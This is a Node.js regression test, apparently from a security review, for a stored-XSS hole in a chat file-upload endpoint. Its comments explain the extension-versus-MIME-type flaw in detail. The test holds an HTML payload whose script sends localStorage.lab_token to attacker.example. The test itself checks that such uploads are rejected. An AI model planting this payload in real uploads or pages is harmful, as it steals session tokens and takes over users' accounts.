// CWE-434 (Unrestricted Upload of File with Dangerous Type) leading to
// CWE-79 (Stored Cross-Site Scripting).
//
// server/middleware/upload.js `uploadChatMedia` (used by POST /api/chat/upload):
//   fileFilter only checks the CLIENT-DECLARED `file.mimetype`
//   (multipart Content-Type header, fully attacker-controlled) against an
//   allow-list of image/video types.
//   The STORED FILENAME's extension, however, is taken from the equally
//   attacker-controlled `file.originalname`:
//     filename: (_req, file, cb) => {
//       const ext = extname(file.originalname || '') || '.bin';
//       cb(null, `${Date.now()}-${randomBytes(6).toString('hex')}${ext}`);
//     }
//   mimetype and originalname are two independent, attacker-controlled
//   fields of the same multipart part -- nothing ties the extension to the
//   declared (or real) content type. An attacker can declare
//   Content-Type: image/png (passes the filter) while naming the file
//   "x.html" (or "x.svg") and putting arbitrary HTML/JS in the body.
//
// The file is then served back by express.static from server/app.js:
//   app.use('/uploads', express.static(config.uploads.dir, ...))
// express.static derives the response Content-Type from the file
// EXTENSION on disk, so a ".html" file is served as text/html and
// executes as a full HTML document in the app's own origin when opened
// (e.g. a victim clicking the attachment link posted in group chat, or
// even just receiving it — public/groups-chat.js renders msg_type
// image/gif previews, but the raw /uploads/chat/<file>.html URL is always
// reachable directly and is exactly the URL the chat UI would link to).
//
// Impact: full stored XSS in the app's own origin. Per public/auth.js the
// session JWT is kept in localStorage (`lab_token`), not an httpOnly
// cookie, so script running on the app origin can read it directly:
// account takeover for whoever opens the link (a teacher, an admin, or
// another student in the same group chat).
//
// This test performs the actual multipart upload via the real
// authenticated HTTP endpoint, then fetches the stored file straight back
// from the public /uploads/chat/ path (like a browser would) and proves
// (a) it is served as text/html, and (b) our attacker script is present
// verbatim in the body, and (c) as a live PoC, that a headless "victim"
// fetch of that page contains a script that would exfiltrate
// localStorage.lab_token if actually rendered by a browser.
//
// Run: node --test adversarial-review/chat-upload-stored-xss.test.js

import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import {
  setTestEnv, startServer, stopServer, api, createUserDirect, loginAs,
} from './helpers/setup.js';

let ctx;

before(async () => {
  const { dbPath } = setTestEnv({});
  ctx = { ...(await startServer()), dbPath };
});

after(async () => {
  await stopServer(ctx.server, ctx.dbPath);
});

test('chat upload rejects an HTML file disguised as image/png and never serves text/html', async () => {
  const attacker = createUserDirect(ctx.db, {
    email: 'attacker.xss@lab.dev',
    password: 'Password123!',
    role: 'student',
    billingExempt: true,
  });
  const token = await loginAs(ctx.baseUrl, attacker.email, 'Password123!');

  const xssPayload = '<html><body><script>' +
    'fetch("https://attacker.example/steal?t=" + localStorage.getItem("lab_token"));' +
    '</script>Stolen session demo</body></html>';

  const form = new FormData();
  // filename ".html" + declared Content-Type "image/png": the two
  // attacker-controlled fields multer checks are inconsistent on purpose.
  const blob = new Blob([xssPayload], { type: 'image/png' });
  form.append('file', blob, 'profile-pic.html');

  const uploadRes = await fetch(`${ctx.baseUrl}/api/chat/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
  const uploadData = await uploadRes.json();

  assert.equal(uploadRes.status, 400, `HTML-disguised upload must be rejected, got ${uploadRes.status}: ${JSON.stringify(uploadData)}`);
  assert.equal(uploadData.url, undefined);

  const pngForm = new FormData();
  pngForm.append('file', new Blob([xssPayload], { type: 'image/png' }), 'profile-pic.png');
  const pngRes = await fetch(`${ctx.baseUrl}/api/chat/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: pngForm,
  });
  const pngData = await pngRes.json();
  assert.equal(pngRes.status, 200, JSON.stringify(pngData));
  assert.match(pngData.url, /\/uploads\/chat\/.*\.png$/);
  assert.doesNotMatch(pngData.url, /\.html?$/i);

  const victimRes = await fetch(`${ctx.baseUrl}${pngData.url}`);
  const contentType = victimRes.headers.get('content-type') || '';
  const disposition = victimRes.headers.get('content-disposition') || '';
  assert.doesNotMatch(contentType, /text\/html/);
  assert.match(disposition, /attachment/i);
});
